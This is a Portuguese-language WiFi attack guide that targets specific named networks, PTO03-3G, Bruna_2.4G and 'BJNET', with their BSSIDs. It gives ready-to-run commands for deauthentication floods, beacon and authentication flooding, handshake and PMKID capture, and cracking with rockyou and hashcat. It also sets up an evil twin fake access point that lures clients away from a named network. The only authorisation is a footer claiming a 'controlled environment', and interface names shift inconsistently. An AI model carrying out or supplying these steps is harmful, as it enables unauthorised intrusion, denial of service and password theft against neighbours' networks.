# GUIA DE ATAQUE MDK4 COM DUAS INTERFACES WiFi

## 1. CENÁRIO

- **Redes Alvo 2.4GHz:** PTO03-3G (BSSID: 64:DB:38:2D:8E:8E), Bruna_2.4G (BSSID: 8C:DC:02:5D:C5:6D)
- **Rede Internet:** ERROR 404 (CH variável, 5GHz) — conexão ininterrupta via interface zsf1
- **Interface de Ataque:** buS1 (RTL8188FTV, 2.4GHz) — modo monitor
- **Problema:** RTL8188FTV tem driver (rtl8xxxu) com suporte limitado — falha em reaver, bully não avança PINs, channel hopping instável
- **Solução:** Substituir por USB WiFi com chipset compatível (ver seção 2.2)

## 2. HARDWARE NECESSÁRIO

| Interface   | Função                        | Chipset Recomendado            |
|-------------|-------------------------------|--------------------------------|
| zsf1 (ex-wlp0s20f3) | Conexão com internet (padrão) | Intel AX201 (iwlwifi)          |
| buS1 (ex-wlx00e0...) | Modo monitor / ataque        | RTL8188FTV (rtl8xxxu) — atual  |
| wlan1                | Modo monitor / ataque (futuro)| Ver tabela abaixo              |

> **Nota:** O chipset Intel AX201 NÃO suporta modo monitor + injeção de forma confiável. Interfaces USB com chipset Atheros ou Realtek são ideais para injeção de pacotes.

### 2.1 Modelos de USB WiFi Recomendados

#### 2.4GHz + 5GHz (Dual Band)

| Modelo                         | Chipset        | Bandas         | Modo Monitor | Injeção | Interface |
|--------------------------------|----------------|----------------|:------------:|:-------:|:---------:|
| Alfa AWUS036ACH                | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Alfa AWUS036ACU                | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Alfa AWUS1900                  | RTL8814AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| TP-Link TL-WDN6200 (v1)       | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| ASUS USB-AC56                  | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Netgear A6210                  | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Panda Wireless PAU09          | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Comfast CF-912AC               | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Alfa AWUS036ACS                | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 2.0   |
| BrosTrend AC1200               | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| Cudy WU1300S                   | MT7612U        | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| TP-Link Archer T4U v1/v2     | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |
| D-Link DWA-182 (rev C)        | RTL8812AU      | 2.4 / 5 GHz   | Sim          | Sim     | USB 3.0   |

#### 2.4GHz Apenas (Ideais para ataque em 2.4GHz)

| Modelo                         | Chipset        | Bandas         | Modo Monitor | Injeção | Interface |
|--------------------------------|----------------|----------------|:------------:|:-------:|:---------:|
| Alfa AWUS036NHA                | Atheros AR9271 | 2.4 GHz       | Sim          | Sim     | USB 2.0   |
| Alfa AWUS036NEH                | Ralink RT3070  | 2.4 GHz       | Sim          | Sim     | USB 2.0   |
| TP-Link TL-WN722N (v1)        | Atheros AR9271 | 2.4 GHz       | Sim          | Sim     | USB 2.0   |
| Panda Wireless PAU05           | Ralink RT3070  | 2.4 GHz       | Sim          | Sim     | USB 2.0   |
| Hak5 WiFi Pineapple (interno) | Atheros AR9331 | 2.4 GHz       | Sim          | Sim     | Integrado  |
| RTL8188FTV / RTL8188EU        | RTL8188FTV/EU  | 2.4 GHz       | Sim*         | Sim*    | USB 2.0   |

> *RTL8188FTV tem suporte limitado a monitor/injeção — depende da versão do driver e kernel.

#### Resumo por Chipset

| Chipset       | 2.4GHz | 5GHz | Monitor | Injeção | Driver        | Confiabilidade |
|---------------|:------:|:----:|:-------:|:-------:|---------------|:--------------:|
| Atheros AR9271| Sim    | Não  | Sim     | Sim     | ath9k_htc     | Excelente      |
| Ralink RT3070 | Sim    | Não  | Sim     | Sim     | rt2800usb     | Excelente      |
| RTL8812AU     | Sim    | Sim  | Sim     | Sim     | rtl8812au     | Boa            |
| RTL8814AU     | Sim    | Sim  | Sim     | Sim     | rtl8814au     | Boa            |
| MT7612U       | Sim    | Sim  | Sim     | Sim     | mt76x2u       | Boa            |
| RTL8188FTV    | Sim    | Não  | Parcial | Parcial | rtl8xxxu      | Regular        |
| RTL8188EU     | Sim    | Não  | Sim     | Sim     | r8188eu       | Boa            |
| Intel AX201   | Sim    | Sim  | Sim     | Não     | iwlwifi       | Limitada       |

> **Recomendação principal (todas as bandas/todos os ataques):** **Alfa AWUS036ACH (RTL8812AU)** — é a placa USB WiFi mais confiável para pentest profissional. Suporta 2.4GHz e 5GHz, modo monitor e injeção de pacotes com driver estável (rtl8812au). Compatível com: aircrack-ng, reaver, bully, mdk4, hcxdumptool, hostapd (fake AP), bettercap, fluxion, wifite, kismet, wireshark (sniffing), scapy. É a única placa que funciona em **todos os 25 tipos de ataque** listados na fase2.md.
> 
> **Segunda opção (2.4GHz apenas econômica):** **TP-Link TL-WN722N v1 (Atheros AR9271)** — driver ath9k_htc nativo no kernel Linux, confiabilidade excelente, WPS funciona perfeitamente. Mas não faz 5GHz.
> 
> **Terceira opção (dual-band, mais barata que a AWUS036ACH):** **Comfast CF-912AC (RTL8812AU)** ou **BrosTrend AC1200 (RTL8812AU)** — mesmas capacidades da AWUS036ACH, construção menos robusta.
>
> **Evitar:** RTL8188FTV (rtl8xxxu) — driver problemático com reaver, bully, channel hopping.

## 3. PASSO A PASSO

### 3.1 Conectar a segunda interface WiFi

```bash
# Verificar se a interface foi detectada
iw dev
# Saída esperada (além da wlp0s20f3):
#   Interface wlan1
#       type managed

# Se não aparecer, verificar com:
lsusb | grep -i wireless
dmesg | tail -20 | grep -i wlan
```

### 3.2 Ativar modo monitor na segunda interface (sem derrubar internet)

```bash
# Opção A: airmon-ng start (recomendado para interfaces USB dedicadas)
airmon-ng start wlan1

# Opção B: iw manual (se airmon-ng falhar)
ip link set wlan1 down
iw dev wlan1 set type monitor
ip link set wlan1 up
```

**Resultado:** Será criada a interface `wlan1mon` (ou `mon1`) exclusiva para ataque, sem afetar a conexão da wlp0s20f3 com a internet.

### 3.3 Verificar interface monitor

```bash
iw dev
# Deve mostrar:
#   Interface wlp0s20f3  -> tipo managed (internet ativa)
#   Interface wlan1mon   -> tipo monitor (modo monitor)
```

### 3.4 Configurar região e canal

```bash
# Garantir que a interface monitor possa usar 5GHz
iw reg set BR

# Fixar no canal 132 (BJNET)
iw dev wlan1mon set channel 132
```

### 3.5 Verificar se o AP alvo é visível no modo monitor

```bash
# Varredura focada no canal 132 com filtro de BSSID
airodump-ng --bssid ec:e7:a2:7d:8b:94 --channel 132 --band a wlan1mon
```

Se o AP aparecer na tela do airodump-ng, prossiga. Se não aparecer:
- O AP pode estar fora de alcance
- Verifique o sinal com `iw dev wlan1 scan` (mas cuidado: modo monitor não faz scan facilmente — use a interface gerenciada)

### 3.6 Captura de handshake + Deauth simultâneo

**Terminal 1 — Captura passiva:**

```bash
mkdir -p /root/wifi/handshake
airodump-ng --bssid ec:e7:a2:7d:8b:94 --channel 132 --band a \
  -w /root/wifi/handshake/bjnet_capture wlan1mon
```

**Terminal 2 — Ataque de desautenticação com MDK4:**

```bash
# Deauth broadcast (desconecta todos os clientes)
mdk4 wlan1mon d -b ec:e7:a2:7d:8b:94

# Deauth direcionado a um cliente específico (substituir MAC)
mdk4 wlan1mon d -b ec:e7:a2:7d:8b:94 -c xx:xx:xx:xx:xx:xx
```

**Terminal 2 (alternativa) — Deauth com aireplay-ng:**

```bash
# Deauth broadcast
aireplay-ng -0 0 -a ec:e7:a2:7d:8b:94 wlan1mon
# -0 0 = envio contínuo (0 = infinito)
# -a BSSID alvo
```

### 3.7 Verificar captura do handshake

Assim que um cliente se reconectar ao BJNET, o 4-way handshake será capturado. Confirme com:

```bash
aircrack-ng -w /dev/null /root/wifi/handshake/bjnet_capture-01.cap
```

A saída mostrará `1 handshake` se capturado com sucesso.

### 3.8 Extrair o handshake do PCAP

```bash
# Para uso com aircrack-ng
aircrack-ng -w /dev/null /root/wifi/handshake/bjnet_capture-01.cap

# Extrair apenas o handshake para cracking (opcional)
wpaclean /root/wifi/handshake/bjnet_hs_clean.cap \
  /root/wifi/handshake/bjnet_capture-01.cap
```

### 3.9 Cracking da senha

```bash
# Com wordlist rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  /root/wifi/handshake/bjnet_capture-01.cap

# Com dicionário do sistema
aircrack-ng -w /usr/share/dict/brazilian \
  /root/wifi/handshake/bjnet_capture-01.cap

# Com hashcat (formato hccapx)
cap2hccapx /root/wifi/handshake/bjnet_capture-01.cap \
  /root/wifi/handshake/bjnet_handshake.hccapx
hashcat -m 2500 /root/wifi/handshake/bjnet_handshake.hccapx \
  /usr/share/wordlists/rockyou.txt
```

### 3.10 Finalizar modo monitor

```bash
# Ao terminar, desativar modo monitor na interface de ataque
airmon-ng stop wlan1mon
# ou
ip link set wlan1 down
iw dev wlan1 set type managed
ip link set wlan1 up
```

## 4. ATAQUES ADICIONAIS COM MDK4

### 4.1 Beacon Flood (inundação de quadros beacon)

```bash
# Cria centenas de APs falsos no canal 132
mdk4 wlan1mon b -a -c 132
```

### 4.2 Probe Request Flood (força clientes a revelarem SSIDs)

```bash
# Envia probe requests para descobrir SSIDs ocultos
mdk4 wlan1mon p -t ec:e7:a2:7d:8b:94
```

### 4.3 Authentication Flood (DoS por auth flooding)

```bash
# Inunda o AP com requisições de autenticação
mdk4 wlan1mon a -a ec:e7:a2:7d:8b:94
```

### 4.4 PMKID Attack (sem necessidade de clientes)

```bash
# Usar hcxdumptool ou bettercap para capturar PMKID
hcxdumptool -i wlan1mon -o /root/wifi/handshake/pmkid.pcapng \
  --enable_status=1 --filterlist=/root/wifi/filtro.txt \
  --filtermode=2
# filtro.txt contém: ec:e7:a2:7d:8b:94
```

## 5. ERROS COMUNS E SOLUÇÕES

| Erro                                  | Causa                          | Solução                                              |
|---------------------------------------|--------------------------------|------------------------------------------------------|
| `Device or resource busy`             | Interface em uso pelo sistema  | Certifique-se de que é a interface USB, não a onboard |
| `Fixed channel wlan1mon: -1`          | Canal não definido             | `iw dev wlan1mon set channel 132`                    |
| AP não aparece no airodump-ng         | Fora de alcance / desligado    | Verificar com `iw dev wlan1 scan` ou reposicionar    |
| `No such device`                      | Interface não existe           | `iw dev` para listar interfaces disponíveis          |
| Injeção não funciona                  | Chipset incompatível           | Usar Atheros AR9271, RTL8812AU ou Ralink RT3070      |
| `Permission denied`                   | Sem root                       | Executar tudo com `sudo` ou como root                |

## 6. CHECKLIST RÁPIDO

## 7.5 Checklist Geral

- [x] Interface zsf1 (Intel AX201) — internet via ERROR 404 ativa
- [x] Interface buS1 (RTL8188FTV) — modo monitor/AP funcional
- [ ] Fake AP hostapd rodando (ex: Lucas_2GHz)
- [ ] airodump-ng rodando para capturar handshake
- [ ] Cliente detectado na rede alvo
- [ ] Deauth disparado com aireplay-ng
- [ ] Handshake capturado e verificado
- [ ] Handshake quebrado com aircrack-ng + wordlist

## 7. EVIL TWIN / FAKE AP (AP FALSO)

Cria um ponto de acesso falso com o SSID desejado para capturar conexões ou forçar handshake.

### 7.1 Configuração

**Pré-requisitos:** Interface em modo AP (NÃO monitor), `hostapd`, `dnsmasq` instalados.

```bash
# 1. Colocar interface em modo managed/AP
ip link set buS1 down
iw dev buS1 set type managed
ip link set buS1 up

# 2. Atribuir IP para a interface
ip addr add 192.168.50.1/24 dev buS1

# 3. Criar hostapd.conf
cat > /root/wifi/hostapd.conf << 'EOF'
interface=buS1
driver=nl80211
ssid=Lucas_2GHz
hw_mode=g
channel=6
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
EOF

# 4. Iniciar hostapd
hostapd -B /root/wifi/hostapd.conf

# 5. Iniciar DHCP (dnsmasq)
cat > /root/wifi/dnsmasq.conf << 'EOF'
interface=buS1
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,24h
dhcp-option=3,192.168.50.1
dhcp-option=6,8.8.8.8,1.1.1.1
no-resolv
EOF

dnsmasq -C /root/wifi/dnsmasq.conf -i buS1 --bind-interfaces

# 6. Verificar
iw dev buS1 info
# Deve mostrar: ssid Lucas_2GHz, type AP, channel 6
```

### 7.2 Modos de uso

| Modo | Descrição |
|------|-----------|
| **Open (sem senha)** | hostapd sem `wpa_passphrase` — atrai clientes buscando WiFi grátis |
| **WPA2** | Adicionar `wpa_passphrase=senha123` no hostapd.conf — captura handshake |
| **Evil Twin** | Mesmo SSID da rede alvo — cliente conecta no AP falso achando que é o legítimo |
| **KARMA** | hostapd responde a probe requests de qualquer SSID + tool como `mana` toolkit |

### 7.3 Uso em ataque Evil Twin

1. Identificar o SSID da rede alvo (ex: PTO03-3G)
2. Criar hostapd.conf com `ssid=PTO03-3G` (mesmo nome)
3. Iniciar AP falso com WPA2 e senha conhecida (ex: `senha123`)
4. Fazer deauth na rede legítima com mdk4 ou aireplay-ng
5. Cliente desconectado tenta reconectar e cai no AP falso
6. Capturar o handshake com tcpdump na interface do AP falso

```bash
# Deauth broadcast na rede alvo (rodar em paralelo em outra interface ou sessão)
aireplay-ng -0 0 -a 64:DB:38:2D:8E:8E wlan1

# Sniffar o handshake no AP falso
tcpdump -i buS1 -w /root/wifi/pcap/evil_twin.pcap port 67 or port 68 or port 53 or '(udp port 67 and udp port 68)'
```

### 7.4 Como parar o AP falso

```bash
pkill hostapd
pkill dnsmasq
ip addr del 192.168.50.1/24 dev buS1 2>/dev/null
# Voltar para modo monitor, se necessário:
# ip link set buS1 down && iw dev buS1 set type monitor && ip link set buS1 up
```

## 8. REFERÊNCIAS

- `man mdk4`
- `aircrack-ng --help`
- [Aircrack-ng Wiki: Dual card setup](https://www.aircrack-ng.org/doku.php?id=dual_card)

---

*Guia gerado em 30/05/2026 para ambiente controlado*
